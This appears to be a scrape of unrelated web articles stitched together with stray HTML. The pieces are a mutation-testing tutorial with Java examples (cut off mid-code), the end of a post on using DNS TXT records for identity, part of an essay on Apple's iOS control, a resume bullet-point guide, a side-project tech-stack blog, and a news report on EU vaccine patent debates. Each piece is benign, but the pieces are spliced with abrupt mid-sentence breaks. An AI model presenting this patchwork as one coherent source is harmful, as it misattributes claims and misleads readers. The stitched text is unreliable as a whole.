<p>The philosophy behind Mutation-Driven-Testing is simple. The only way to assess the reliability of your test suite, is to see whether it fails when a bug is present. So inject that bug yourself. Use the resulting output to figure out where your coverage holes are, and strengthen them as appropriate. Not just to catch the specific bug you just injected, but any other similar category of bug too. By doing this, you can identify the blind spots in your test suite, and strengthen your test coverage accordingly.</p>



<p><em>Sidenote: <a href="https://pitest.org/" target="_blank" rel="noreferrer noopener">There is tooling out there</a> that attempts to automate the above form of mutation testing. I look forward to the day when they become mainstream, and just as comprehensive. For now, this article will focus on manually injected mutations.</em></p>



<h2>A TDD Example</h2>



<p>If you listen closely, you can hear a million TDD proponents crying out in protest.</p>



<p><em>“But you don’t need to do Mutation Testing if you’ve actually done TDD! If you do TDD correctly, every single piece of functionality will have a dedicated test, so you will never ever have a coverage hole!”</em></p>



<p>To illustrate why this is not true, and to demonstrate the benefits of Mutation-Driven-Testing, I have put together the following example. <a href="https://technologyconversations.com/2013/12/20/test-driven-development-tdd-example-walkthrough/" target="_blank" rel="noreferrer noopener">The source of the example</a> is the top google result, when you search for “TDD Example”.&nbsp;</p>



<p>One might argue that the author of this article is not a good role model for TDD. That <em>“no true TDD practitioner”</em> would write tests like in the above example. But this really is just sour grapes. The author is making a concerted effort to write comprehensive tests, has done a good job, and the example chosen below is very simple. The reality of TDD in the workplace, is that most practitioners aren’t perfect, and are always prone to some oversights. Oversights that can be flagged and fixed with Mutation-Driven-Testing.</p>



<p>Without further ado, let’s dive into the example – creating a simple string-based calculator. For the sake of conciseness, let’s look at just the first 3 requirements in the example, along with their implementations and tests.</p>



<p>Requirements:</p>



<ol><li>The method can take 0, 1 or 2 numbers separated by comma</li><li>For an empty string the method will return 0</li><li>Method will return their sum of numbers</li></ol>



<p>Tests:</p>


<pre title="">private static final TddExample EXAMPLE = new TddExample();

@Test(expected = RuntimeException.class)
public final void whenMoreThan2NumbersAreUsedThenExceptionIsThrown() {
  EXAMPLE.add("1,2,3");
}

@Test
public final void when2NumbersAreUsedThenNoExceptionIsThrown() {
  EXAMPLE.add("1,2");
  Assert.assertTrue(true);
}

@Test(expected = RuntimeException.class)
public final void whenNonNumberIsUsedThenExceptionIsThrown() {
  EXAMPLE.add("1,X");
}

@Test
public final void whenEmptyStringIsUsedThenReturnValueIs0() {
  Assert.assertEquals(0, EXAMPLE.add(""));
}

@Test
public final void whenOneNumberIsUsedThenReturnValueIsThatSameNumber() {
  Assert.assertEquals(3, EXAMPLE.add("3"));
}

@Test
public final void whenTwoNumbersAreUsedThenReturnValueIsTheirSum() {
  Assert.assertEquals(3+6, EXAMPLE.add("3,6"));
}
</pre>


<p>Implementation:</p>


<pre title="">public int add(final String numbers) {
  int returnValue = 0;
  String[] numbersArray = numbers.split(",");
  if (numbersArray.length &gt; 2) {
    throw new RuntimeException("Up to 2 numbers separated by comma (,) are allowed");
  }
  for (String number : numbersArray) {
    if (!number.trim().isEmpty()) { // After refactoring
      returnValue += Integer.parseInt(number);
    }
  }
  return returnValue;
}
</pre>


<p>Certainly seems like a good suite of tests that covers all functionality. But how well does it stand up to Mutation-Driven-Testing? In the real world, I would inject bugs one at a time, and run the tests after each injection. But for the sake of conciseness, let’s just inject all the relevant bugs at once.</p>



<h2>Mutation 1: Empty vs Blank</h2>


<pre title="">if (!number.trim().isEmpty())
</pre>


<p>This is a bit of a freebie, but worth pointing out. What if we just removed the <em>trim()</em> call from our implementation. Certainly seems like a plausible oversight.</p>


<pre title="">if (!number.isEmpty())
</pre>


<h2>Mutation 2: Return 0 for Empty String</h2>


<pre title="">if (!number.trim().isEmpty()) { // After refactoring
  returnValue += Integer.parseInt(number);
}
</pre>


<p>The requirement says to return 0 for an empty string. Presumably, based on the author’s implementation, this means that any empty sub-string should be treated as 0, whereas previous non-empty sub-strings should still be summed. But what if the implementation does something different and returns 0 as soon as it sees any empty string?</p>


<pre title="">if (number.trim().isEmpty()) { return 0; }
returnValue += Double.parseDouble(number);
</pre>


<h2>Mutation 3: Three Inputs are not allowed</h2>


<pre title="">if (numbersArray.length &gt; 2) {
  throw new RuntimeException("Up to 2 numbers separated by comma (,) are allowed");
}
</pre>


<p>The requirement says that the method can take <em>“0, 1 or 2 numbers.”</em> So…. we should check for 3 numbers and throw an exception?</p>



<p>This is admittedly a pretty foolish bug, but never underestimate how creative fools can be.</p>


<pre title="">if (numbersArray.length == 3) {
  throw new RuntimeException("Up to 2 numbers separated by comma (,) are allowed");
}
</pre>


<h2>Mutation 4: Double vs Int</h2>


<pre title="">returnValue += Integer.parseInt(number);
</pre>


<p>When building a “string -&gt; numeric” calculator, with an integer final result, there are many different ways of implementing string conversions:</p>



<ol><li>Convert string to int, perform int operations, return an int result. Throw an exception if your input string is not an int</li><li>Convert string to double, cast the double to an int, perform int operations, return an int result</li><li>Convert string to double, perform double operations, cast the final result to an int and return it</li></ol>



<p>The above 3 approaches all produce completely different outputs when given an input like <code>"1.5, 1.5"</code>. In the example, the author had implemented option #1. Let’s assume that is indeed the desired behavior. But what if he had mistakenly implemented option #3?</p>


<pre title="">returnValue += Double.parseDouble(number);
</pre>


<h2>Putting It All Together</h2>



<p>In practice, we would only inject a single bug at a time. But for the purposes of conciseness, let’s combine all of them, which leaves us with the following mess:</p>


<pre title="">public int add(final String numbers) {
  double returnValue = 0;
  String[] numbersArray = numbers.split(",");
  if (numbersArray.length == 3) {
    throw new RuntimeException("Up to 2 numbers separated by comma (,) are allowed");
  }
  for (String number : numbersArray) {
    if (number.isEmpty()) { return 0; }
    returnValue += Double.parseDouble(number);
  }
  return (int) returnValue;
}
</pre>


<p>Amazingly, not a single test has failed! Every single test written by the author is still green, despite us injecting plausible bugs in every other line. Demonstrating that our test suite has the following holes:</p>



<ol><li>It is not testing for blank inputs</li><li>It is not testing for empty/blank substrings where a number is supposed to be</li><li>It is not testing for arbitrary numbers of inputs</li><li>It is not testing for numeric non-integer inputs</li></ol>



<p>And once you’ve identified the above holes, you can start plugging them by adding more tests. Tests that are now failing, and start passing once you revert all the injected bugs:</p>


<pre title="">@Test(expected = NumberFormatException.class)
public void doubleInputProvided_shouldThrowException() {
  EXAMPLE.add("1.5,1.5");
}

@Test
public void blankString_shouldReturn0() {
  Assert.assertEquals(0, EXAMPLE.add(" "));
}

@Test
public void emptyStringAfterNumbers_shouldIgnoreIt() {
  Assert.assertEquals(1, …</pre></div></div>

  <li>Highly available: It should (almost) never go down. One company going bankrupt or changing strategic direction shouldn’t kill it.</li>
  <li>Censorship resistant: It should only be possible to take down records with a court order. Corporate censorship should be impossible, or at least historically infrequent.</li>
  <li>Cheap: But not free! Free services come with few no guarantees, and even fewer rights for their users.</li>
  <li>Low maintenance: User only needs to get involved when the data needs to change. No operational burden</li>
  <li>Easy to use: Clients should be able to read information trivially.</li>
</ol>

<p>There are a lot of services that check some of these boxes. Twitter for instance does pretty well, but fails badly on 3, 4 &amp; 5. This is where most services fall down, so I focused there. After pondering this for a while, I realized that we’ve already got a great solution that checks all the boxes: DNS.</p>

<h3 id="highly-available">Highly available</h3>

<p>There are many services that are highly available in the technical sense, meaning they rarely crash, but suffer from economic risk. The ultimate crash is the business that provides the service going bankrupt or changing strategic direction. DNS doesn’t suffer from the same economic risk that centralized services do because there are many, many independent registrars and DNS service providers out there.</p>

<h3 id="censorship-resistance">Censorship resistance</h3>

<p>I would argue that DNS registries are censorship <em>resistant</em> based on the historical record. Whatever you think about the situation, the fact is Parler the application got vaporized in a day, but Parler.com is still registered. The Pirate Bay is one of the most taken down sites in history, and thepiratebay.org is still registered.</p>

<h3 id="cheap">Cheap</h3>

<p>This one is easy. There are loads of registrars that sell a variety of gTLD subdomains, complete with DNS service, for less than $10 per year. Enough said.</p>

<h3 id="easy-to-use">Easy to use</h3>

<p>DNS does so well on the other requirements, it’s a shame that we’d have to use some arcane protocol to query it. Oh wait…</p>

<div><div><pre><code>curl -s -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=landshark.io&amp;type=TXT'  | jq -r .Answer[].data

"v=me; email=alan.gibson@gmail.com"
"v=me; twitter=handheld"
"v=me; blog=https://landshark.io"
"v=me; gravatar=https://www.gravatar.com/avatar/123456"
"v=me; bitcoin=123456789"
</code></pre></div></div>

<p>DNS over HTTP (DoH) means DNS is now trivially easy to query and hard to snoop on. Not too shabby.</p>

<h3 id="a-better-way">A better way</h3>

<p>On the Internet, I’m alan.gibson@gmail.com, as well as twitter.com/handheld, news.ycombinator.com/user?id=alangibson, and so many more. Wouldn’t it be alot simpler if  we used DNS TXT records to store all those various identifiers in one place so that you could find me anywhere just by knowing that I’m landshark.io?</p>

<p>Sounds like a pretty slick solution to me. What do you think? <a href="https://news.ycombinator.com/item?id=26024845">Discussion is happening in this Hacker News thread.</a></p>

</div></div><div data-block-type="2" id="block-78a04d1642024dbcaa69"><div><p><strong>Chapter One: The Creation of Today’s Internet and the Needs of Tomorrow’s</strong></p><p>One of the neat things about the internet is who created it, why, and how.&nbsp;</p><p>Throughout the 1960s to 1990s, the foundation of today’s internet was built through a variety of consortiums and informal working groups composed of government research labs, public universities and independent technologists. These typically not-for-profit collectives typically focused on establishing common standards that would help them share information from one server to another (i.e. messages or files), and in doing so, make it easier to collaborate on future technologies, projects and ideas.&nbsp;</p><p>The internet’s quirky provenance is responsible for many of its best modern attributes. Today, everyone can create content on the internet, everyone is technically capable of accessing everything on the internet, and every web page on the internet can connect to another without the user needing to change browser, device or client. This flexibility, interoperability and universality isn’t by decree - there’s no Head of the Internet mandating the right to create, host or access/connect to a website.&nbsp;</p><p>Instead, this is a byproduct of the internet’s open standards, programming, markup languages and so on. These ensure that a user doesn’t need to pay for a web browser or to load a website, nor does the owner of a website need to pay for the code used by their website. Services like Zoom also work because they leverage actively maintained standards that are free to use and designed to support any device. Every device maker needs to support these standards in order to have happy customers. Some of us now recoil against aggressive data collection, ad insertions and tracking, but this is partly because we don’t <em>need</em> to give these up. The use of standards, such as HTML, means that browser extensions can block ads or tracking. We may be willing to give up data for a free service, but the Internet’s makeup means we don’t have to.</p><p>The benefits here are hard to overstate. But just imagine, for example, how the internet might differ if it had been created by multinational media conglomerates in order to sell things, serve ads or harvest user data for profits. Downloading a .JPG could cost money, with a .PNG costing 50% more. Teleconferencing software might have required the use of a broadband operator’s app or portal (e.g. Welcome to your Xfinity Browser™, click here for Xfinitybook™ or XfinityCalls™ powered by Zoom™). Websites might only work in Internet Explorer <em>or</em> Chrome - and need to pay a given browser an annual fee for the privilege. Or maybe users would need to pay their broadband provider extra fees to read certain programming languages or use a given web technology (“This website requires Xfinity Premium with 3D Rendering”). Regardless of the specific differences, it’s likely internet penetration would be lower, as would usage and associated commerce.</p><p>The web’s cross-platform, standards-based and non-profit origins are inseparable from the internet’s rapid growth, the trillions of dollars in companies that have been founded over the past 30 years, and the positive societal impact of these companies (e.g. a drop in the cost and increase in the quality of communications, the reduction in gatekeeper power, lowered transaction fees, etc.).&nbsp;</p><p>Today’s heavily conglomerated internet giants remain mindful of the fact that open APIs, common standards, exportable data, etc., all help grow both the internet technology acceptance model and, in most cases, their own bottom lines. But these companies are less concerned with how the overall market grows than their share and control of this growth. Technology companies, almost by definition, prefer that the market build on top of or through them than have new entrants build around or in competition with them. As a result, the same companies that emerged thanks to openness tend to reject these principles where they might undermine their strategic position.</p><p>This isn’t an unusual disposition for a for-profit company, but the implications are particularly powerful in digital markets. In the offline world, free market economics enable robust competition that typically delivers the best products, variety and prices for consumers, and moderates the power of the strongest market players (if only due to diseconomies of scale). Online, incredibly powerful network effects and zero-cost marginal revenues/distribution has enabled dominant platforms to push back against the open nature of the internet, forcing consumers and creators to use them as universal intermediaries, and subduing standard market forces.</p><p>Right now, we are on the cusp of the next internet. The terms used for this future vary and the degree to which you believe in one label or vision is not particularly relevant. And the technologies to design, enable and support the fullest version of this are as far from the capabilities of 2021 as the 1990s Internet is from us today. But what matters is that a growing share of our time will be spent within virtual spaces and with virtual goods — for education, work, health, politics and leisure. Sometimes these spaces and goods will be purely virtual, other times virtual twins of physical ones, and sometimes augmented reality. For related reasons, a growing percentage of our income will be spent on virtual assets, goods, experiences — many of which we’ll be able to sell, trade, share, use or improve. And of course, enormous new industries, marketplaces and resources will emerge to enable these opportunities, with novel types of labor, skills, professions and certifications invented to serve them.&nbsp;</p><p>There’s no way for this future to be developed as the original internet was. The US government and public research institutions led the development of the information superhighway in part because few in private businesses understood the commercial potential of a World Wide Web, but also because these non-profits were essentially the only entities with the computational talent, resources and ambitions to build it. Conversely, all of today’s mega-tech companies are deep believers in this future internet, and are best positioned (via resources and talent) to build it.&nbsp;</p><p>The most important impediment today is Apple. Although no company has done more to propel the last 15 years of the internet, its policies are unlikely to produce the most prosperous overall ecosystem and do not lay a strong groundwork for the “next Internet”. Instead, Apple is inhibiting this future Internet. And it does so via tolls, controls, and technologies that not only deny what made and still makes the open web so powerful, but also prevents competition, and prioritize Apple’s own profits.</p><p><span><strong>Chapter Two: There’s Apple, then GAFM</strong></span></p><p>Apple’s adverse effects stem from three interconnected and increasingly powerful elements.</p><p>First, Apple believes it knows better than consumers, the developer community, and the market at large. This includes which technologies should be adopted by the internet community, the role of user agency (and the extent to which users are capable of informed consent), and common business practices around user data, privacy and security.</p><p>This disposition led Apple to limit the role of the marketplace <em>on its </em>device (something the company did not do for the Mac). Specifically, Apple mandates that on its devices:</p><ol data-rte-list="default"><li><p>All applications would need to be distributed by the Apple App Store, and could not be directly downloaded from the app maker or a third party app store</p></li><li><p>All applications distributed by the App Store would need to be approved by Apple, and approval would be contingent upon an extensive list of policies and requirements</p></li><li><p>All applications distributed by the Apple App Store would need to conform with the App Store’s billing policies, which typically meant that Apple was the exclusive in-app biller for iOS applications</p></li></ol><p>These three layers are technically different — the ability to use an operating system driver has nothing to do with the ability to distribute an app to the consumer or charge for them for a given piece of content or function. However, Apple’s iOS devices forced them together. If a developer wants to make an app, they need access to native drivers. And if a developer wants access to native drivers, their apps need to be distributed by the App Store. And if they want to use the App Store, they must adhere to Apple’s policies, which means using Apple’s billing systems.&nbsp;</p><p>Apple’s control and integration allowed it to offer a best-in-class mobile experience that also helped repel the most pernicious aspects of the online world; onboard and engage less technically savvy users; and develop a richly monetized app ecosystem. This, in turn, led to unprecedented success. <a href="https://www.ben-evans.com/benedictevans/2020/8/18/app-stores">Today, the iPhone has 66% market share in the United States, 75% of U.S. App Store revenues, and over 80% of time spent on the mobile internet</a> (iOS’s share of physical e-commerce transactions is likely somewhere in the middle of this range). And this dominance is also growing. Eighty percent of U.S. teenagers have iPhones and the device held 90% of smartphone activations in the week after Christmas 2020.</p><p>While Apple’s closed approach is why the company’s products are so successful, the enormity of this success is what makes this approach so problematic. There is no proprietary, closed system that affects more lives on a daily basis than that of iOS. Due to this fact, Apple has become a de facto regulator for the internet; a single for-profit body that wields enormous soft, hard, and even accidental power.&nbsp;&nbsp;</p><p>There are almost no large companies in the world that can live without a mobile app (these apps are …</p></div></div></div></div></div></div></div></div></article></div></div></div></section></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>A <a href="https://www.meetleet.com/blog/how-to-write-a-great-technical-resume">great technical resume</a> is mostly composed of bullet points. That means perhaps ⅔ of your resume will be used to list your career accomplishments. For most engineers, it feels challenging to summarize your entire career in 10 or 25 bullet points. With a little <a href="https://leetresumes.com/blog/leet-resumes-technical-resume-documentation">guidance</a>, however, and some focus on what’s most important, it’s pretty easy to get right. Let’s review your best approach for handling bullets on a technical resume, which is how Leet Resumes handles bullets when we <a href="https://signup.meetleet.com/">write technical resumes for experienced technology professionals for free</a>.</p><h2>Your Bullet Points Should Emphasize Your Accomplishments</h2><p>A resume is only used in a career context, not in your homelife, hobbies, or friendships. That’s because a resume is a commercial document with a commercial purpose - to help you get your next job. And the way a resume helps you get our next job is by generating interview requests. </p><p>It’s <a href="https://www.meetleet.com/blog/what-a-great-technical-resume-can-do-for-you">purpose</a> is not to catalog your entire career, it’s not to explain why you left each job, it’s not to describe every project you ever worked on, it’s not even to make you feel good about yourself, although it might.</p><p>A resume exists to persuade a hiring manager or a recruiter to select you for an interview from the pile of resumes they are reviewing. And the best way to generate interview requests is to appeal to your <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">future boss or hiring manager’s need to solve a problem</a>. And the best way to demonstrate your ability to solve problems is to write effective bullet points that use numbers to quantify your accomplishments. Quantified accomplishments are superior to opinion-based accomplishments, catch the recruiter's eye more easily, and set you apart from the other resumes in the stack.</p><p>Let’s review some different types of bullet points commonly seen on technical resumes.</p><h2>Bullet Point Styles on Technical Resumes</h2><h3>Event-based</h3><ul><li>Shipped</li><li>Migrated</li><li>Launched</li><li>Developed</li><li>Re-architected</li><li>Refactored </li></ul><p>Most technical resumes default to event-based bullet points. It’s easiest because it mirrors your experience, and how you think about your past work. You shipped, migrated, or launched something.</p><p>The limitation of this bullet point style is that it does not tell a hiring manager or future boss how <strong>well</strong> you did the job. After all, everyone who showed up to work shipped, migrated or launched something. When you don’t provide details, it makes it difficult for a hiring manager to understand how much better you are than the average developer. Event-based bullet points leave it up to chance that a hiring manager will pick you from the pile.</p><h3>Performance-based</h3><ul><li>Improved availability by xxx%</li><li>Reduced latency by xx %</li><li>Improved security by releasing xx features</li><li>Deployed xx clusters, reducing maintenance costs by yy %</li><li>Identified xx items for improvement in existing systems</li><li>Improved system by increasing xx, reducing yy, optimizing zz items</li><li>Hired xx engineers </li><li>Built system that replaced manual system, saving xx days work annually</li><li>Fixed xx bugs </li><li>Refactored system to be 10x scalable</li></ul><p>Performance-based bullet points are the most effective style of bullet point. Performance-based bullet points use the <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">Action - Number - Method pattern</a>. They combine an <strong>action</strong> indicating a change in state, with a specific objective <strong>numerical</strong> value indicating the scale of the change, and a <strong>method</strong> by which the change was effected, typically highlighting your skill in doing so.</p><p>Performance-based bullet points tell a more complete story to the hiring manager as she is reviewing resumes. By detailing your past performance, it’s easier for her to estimate how you might contribute to her team in the future. It’s easier for her to understand that performance is important to you, and the types of performance improvements you’ve created in the past. </p><p>As a result, when screening resumes, performance-based bullet points with numbers get picked more often.</p><h3>Administrative</h3><ul><li>Responsible for</li><li>Attend scrum meetings</li><li>Participated in retrospectives</li><li>Performed code reviews</li><li>Conduct testing </li><li>Assigned tasks to staff or peers</li></ul><p>Another common bullet point style on technical resumes is the listing of administrative duties and responsibilities. These are often copied and pasted directly from job descriptions. Perhaps that’s why they’re so popular – it’s the lowest effort way to create a resume.</p><p>Unfortunately, they’re also very ineffective. Hiring managers are familiar with job descriptions - after all, they’re the ones writing them! So if your experience looks like every other job description and resume they’ve seen, they have no ability to understand that you are a better and different talent. </p><p>In addition, listing basic administrative duties such as these don’t help you stand out. Your resume is not going to be selected from a stack because you attended scrum testings, ran unit tests, or did code reviews. Those are really considered to be basic behaviors that any experienced technology professional has done.</p><p>Because this style is ineffective at getting your resume selected for an interview, you should avoid using the Administrative style bullet point.</p><h3>Organizational</h3><ul><li>Promoted to / Selected to join</li><li>Transferred to</li><li>Assigned to</li><li>Joined</li><li>Worked on</li></ul><p>Finally, there is the Organizational style bullet point. These are commonly used to explain how you ended up working on a particular project. With one exception, these, too, should be avoided.</p><p>Organizational bullet points put too much focus on the configuration of your work in a prior company.  As a result, they do little to explain why your work is relevant to the hiring manager, or why he should select your resume for an interview. </p><p>Every company has its own method for assigning, transferring or matching engineers to required work. It’s probably different than the one used at the company you’re applying to. As a result, they tell the hiring manager relatively little about you, your capabilities, or your performance. </p><p>The one exception is “Promoted / Selected to Join.” Promotions and competitive selections <strong>do</strong> explain something about your performance to a hiring manager. They inform that the people who know you best, and who worked with you most closely, decided that you were ready for more responsibility. And that fact <strong>is </strong>helpful in getting your resume selected for an interview.</p><p>So when it comes to bullet points on your <a href="https://www.meetleet.com/blog/how-to-write-a-great-technical-resume">technical resume</a>, use the Action - Number - Method pattern, and prefer performance-based bullet points. This combination is most effective at getting your resume selected for interview requests, and getting you ahead in your career.</p><p>If you’d like Leet Resumes to write your technical resume for free, please <a href="https://signup.meetleet.com/">sign up</a>.</p></div></div></div></div>]]>

                <h3>My Most Productive Project Stack</h3>
                
            </p>

            <p>I have started literally hundreds of side projects and never finished any that had any sort of substance. The
projects I tend to be most successful with finishing are those I can complete in one sitting or at most one weekend
(I have made A LOT of telegram bots).</p>
<p>However, I recently <em>actually</em> finished a side project that took me multiple months… and I think i’ll be
able to do it again. By seeing a project through to completion, I learnt a lot about keeping myself motivated and,
perhaps more importantly, which tools <em>stayed (mostly) out of the way</em> to enable me to focus on the idea rather than
battling with errors.</p>
<p>This blog post is going to focus on the stack I used, and I will write another on how I launched sponsorasong and what I
learnt.</p>

<p>I have done my fair share of fundraising over the past century or so. The current options of fundraising platforms are a
little mechanical, and I felt there was a room for a little gamification (and fun).</p>
<p><a href="https://sponsorasong.com/">https://sponsorasong.com</a> is an idea I have had in my head for a long time. The concept is a fairly simple one. Here’s an
excerpt from the Product hunt launch Post:</p>
<blockquote>
<p>Sponsor a song is a fun, new and exciting way to fundraise.</p>
<p>Those who are completing an event create a Spotify playlist and commit to listen to it
whilst they complete the event. Each person who donates gets to select one song to add
to the fundraiser’s playlist. Will you be kind and add a motivational track that you
know will help your friend hit a Personal Best or will you scheme with others to ensure
they have to listen to baby shark on repeat for the entirety of a marathon?</p>
<p>The choice is yours.</p>
</blockquote>
<p>I wouldn’t be a good “founder” (I dislike this term for myself but am unsure how else to refer to myself)
if I didn’t use this as an opportunity to try and drive you to the site so if the above
does sound interesting, please check it out <a href="https://sponsorasong.com/">here</a>.</p>

<p>When selecting items for the tech stack I prioritised for rapid development, speed of deployment and ease of
maintenance. I landed on the following items, and I’ll talk through why I think each of them was a great choice and why
I’ll pick them again in the future.</p>
<ul>
<li><a href="https://nextjs.org/">next.js</a></li>
<li><a href="https://vercel.com/">vercel</a></li>
<li><a href="https://workers.cloudflare.com/">Cloudflare workers and CDN</a></li>
<li><a href="https://stripe.com/">Stripe</a></li>
<li><a href="https://aws.amazon.com/">Amazon Relational Database Service</a></li>
</ul>
<h2 id="nextjs">Next.js</h2>
<p>next.js is the “app” framework I have been looking for for a long time. I’m a backend engineer by trade, and find
frontend development pretty challenging due to the speed at which the space moves and CORS issues amongst other things.
If you have even basic React knowledge, after a quick tour of the docs, next.js makes development rapid.</p>
<p>Next.js has a hot reload server all ready to go, and every change you make is instantly shown in the browser. It comes
with an opinionated project structure, handles routing for you and more importantly for me
includes the ability to write server side code right next to your client side code and pass it as props.</p>
<p>The below code is enough to make a http call on the server, get the response, pass it to the frontend and display it.</p>
<div><pre><code data-lang="jsx"><span>function</span> <span>Page</span>({<span>data</span>}) {
    <span>return</span> (
        &lt;<span>div</span>&gt;
            {<span>data</span>}
        &lt;/<span>div</span>&gt;
    )
}

<span>// This gets called on every request
</span><span></span><span>export</span> <span>async</span> <span>function</span> <span>getServerSideProps</span>() {
    <span>// Fetch data from external API
</span><span></span>    <span>const</span> <span>res</span> <span>=</span> <span>await</span> <span>fetch</span>(<span>`https://.../data`</span>)
    <span>const</span> <span>data</span> <span>=</span> <span>await</span> <span>res</span>.<span>json</span>()

    <span>// Pass data to the page via props
</span><span></span>    <span>return</span> {<span>props</span><span>:</span> {<span>data</span>}}
}

<span>export</span> <span>default</span> <span>Page</span>

</code></pre></div><p>This allowed me to prototype and iterate really quickly. Previously I have used Create React App and then built a separate
backend using Go or Node and switched between the code bases depending on which piece I was working on.</p>
<p>The only challenged I faced with next was when I tried to introduce some client side libraries. Next.js sometimes blurs
what is going to be executed in the frontend and what will be Server Side rendered and can make debugging issues tricky.
This could very well be due to my lack of expertise in this space though.</p>
<h2 id="vercel">Vercel</h2>
<p><a href="https://mattjamesboyle.com/posts/productive-start-up-stack/vercel.com">Vercel</a> used to be called zeit.co and before that it was now.sh. I have used it over the years to deploy static
sites (this blog was previously hosted there, its now on Cloudflare workers). However, when starting a next.js project it
pushes you towards using Vercel to deployment as it  will “just work”. To get the project deploying using Vercel,
according to the docs, you simply need to:</p>
<blockquote>
<ul>
<li>Sign up to Vercel.</li>
<li>After signing up, you’ll arrive on the “Import Project” page. Under “From Git Repository”, choose the Git provider you use and set up an integration. (Instructions: GitHub / GitLab / BitBucket).</li>
<li>Once that’s set up, click “Import Project From …” and import your Next.js app. It auto-detects that your app is using Next.js and sets up the build configuration for you. No need to change anything — everything should work just fine!</li>
<li>After importing, it’ll deploy your Next.js app and provide you with a deployment URL. Click “Visit” to see your app in production.</li>
</ul>
</blockquote>
<p>In my experience it really is that simple.</p>
<p>Once setup, everytime I pushed to master, a minute or 2 later my code changes were reflected on my domain. This is a really
powerful and rapid workflow, much better than anything else I have used before (which usually involved deploying multiple
containers with NGINX in front of them).</p>
<h2 id="cloudflare-workers--cdn">Cloudflare Workers &amp; CDN</h2>
<p>I’m sure you are not surprised to see Cloudflare here. I use Cloudflare for all my domain management and get page rules,
HTTPS, caching, DDOS protection and analytics for very little effort. As well as this, I used <a href="https://workers.cloudflare.com/">Cloudflare workers</a>
to schedule some code I wrote to check which campaigns need to be marked as closed and update their status in the Database.
I used the Hello World template from <a href="https://developers.cloudflare.com/workers/starters">here</a> and then just set up a
cron to execute the code daily in the dashboard. Wrangler made development of this very simple and was much easier than
having to set up a crontab on a linux box or deploying a cronjob to a kubernetes instance (again, how I have done this
previously).</p>
<h2 id="stripe">Stripe</h2>
<p>I needed a means to take payments, and I had some experience using Stripe. However, even if I didn’t, it is so easy to get
going and they provide so many different examples, it will be my go to for every side project.  For next.js, there is even
<a href="https://vercel.com/guides/getting-started-with-nextjs-typescript-stripe">this</a> fantastic guide to getting it all hooked up!</p>
<p>As well as helping you capture transactions easily, Stripe also provides a great dashboard for managing payouts,refunds,
disputes etc. For a lot of use cases, this means you won’t need to build out a back office system which is a huge time saver!
Up to now, the Stripe dashboard has fulfilled all my needs and I have no plans to build anything custom. I am interested
to see how long this remains the case though as I develop more complex features.</p>
<h2 id="amazon-relational-database-service">Amazon Relational Database Service</h2>
<p>I’m not sure Amazon is the cheapest or the most user friendly way to create a database, but I have experience using it and
I think one key takeaway for me for rapid development is to <em>use what you know</em>. I’m currently using the AWS free tier  Postgres
db  and with my current throughput I won’t need to upgrade anytime soon. When developing locally, I use docker-compose and
a postgres image.</p>
<h2 id="summary">Summary</h2>
<p>The above tools helped me developer <a href="https://sponsorasong.com/">sponsor a song</a> in record time (for me) and stay motivated as I got to spend most of my time
developing features rather than battling tools. I would use all the above mentioned tools again (and intend to!).</p>
<p>I intend to write a follow-up post with how I launched the project and how it went in the next coming days.</p>
<p>Thanks for reading,</p>

<p>Ever so softly, European politicians are beginning to voice a once unthinkable threat by suggesting they could snatch patents from drug companies to make up for massive shortfalls in the supply of coronavirus vaccines.</p>



<p>Big Pharma businesses have for many years regarded EU countries as unquestioningly loyal allies over intellectual property rights in the international trade arena. The EU could always be relied upon to defend U.S., Japanese and European drugmakers from poor nations in Africa and South Asia that have long wanted the recipe of critical medicines to be handed over to generic manufacturers. </p>



<p>But fury over the inability of companies to deliver on contracts amid the COVID-19 pandemic means that now even European politicians, from the Italian parliament to German Economy Minister Peter Altmaier, are arguing, albeit cautiously, that patents may no longer be as sacrosanct as they once were. </p>



<p>The big question is whether they are just saber-rattling, knowing full well that any patent raid would shatter an ultimate commercial taboo and risk an exodus of leading companies from Europe over fears about the loss of IP.  </p>



<p>The European Commission's Internal Market Commissioner Thierry Breton, a doyen of French big business, is at pains to stress that there is <a href="https://www.politico.eu/?p=1598714">no question of redistributing patents.</a> On Wednesday, he insisted that he would lead efforts by Brussels to help pharmaceutical companies expand their production sites and cooperate on output. “I will make sure they get everything they need,” he said.</p>



<p>That more traditional pro-business stance from Breton will prove comforting to pharma executives, who are now facing far more hostile messaging from other quarters of the EU. </p>



<p>European Council President Charles Michel last week raised the prospect that the EU could adopt “urgent measures” by invoking an emergency provision in the EU treaties in response to supply shortfalls. Commission officials have pointed to powers in Article 122 of the Treaty on the Functioning of the European Union, which ostensibly could be used to force vaccine makers to share their patents or other licenses — known as compulsory licensing.</p>



<p>Europe's most powerful economy minister, Germany’s Altmaier, who hails from the business-friendly center-right Christian Democratic Union, also seemed open to the possibility. During a<a href="https://www.zdf.de/politik/maybrit-illner/corona-virus-ohne-grenzen-hat-europa-die-kontrolle-verloren-sendung-vom-28-januar-2021-100.html" target="_blank"> television talk show</a> last week, Altmaier said compulsory licenses wouldn’t help to increase production in the next couple of months because it would take time to set up additional production centers. But if cooperation among pharmaceutical companies to increase production should fail, he said, he “would be willing to talk about coercive measures.”</p>



<p>Adding to the chorus, Alexis Tsipras, former Greek prime minister and current leader of the main opposition Syriza party, has called for a European patents pool. In an opinion piece for <a href="https://www.politico.eu/article/coronavirus-vaccines-public-good-not-corporate-product/">POLITICO</a> last week, he warned that depending on a few pharmaceutical companies to develop vaccines for the whole of Europe is a “weak” strategy.&nbsp;</p>



<h3>Going nuclear</h3>



<p>India and South Africa are pushing for a nuclear option, above and beyond compulsory licensing. They want a temporary international waiver on the agreement on Trade-Related Aspects of Intellectual Property Rights (TRIPS) for all coronavirus-related medical products, including vaccines and treatments.</p>



<p>This is set to come up on the agenda of the informal <a rel="noreferrer noopener" href="https://www.wto.org/english/tratop_e/trips_e/trips_e.htm" target="_blank">TRIPS Council meeting</a> Thursday, but is set to meet almost universal opposition from wealthy countries at the World Trade Organization, with the EU, U.K., U.S., and Switzerland all coming out against it. </p>



<p>Intriguingly, however, even here, potential cracks are emerging in the longer term European position. In early December, the Italian parliament passed a resolution <a rel="noreferrer noopener" href="https://www.camera.it/leg18/410?idSeduta=0440&amp;tipo=documenti_seduta" target="_blank">calling on the government to support the waiver</a>.</p>



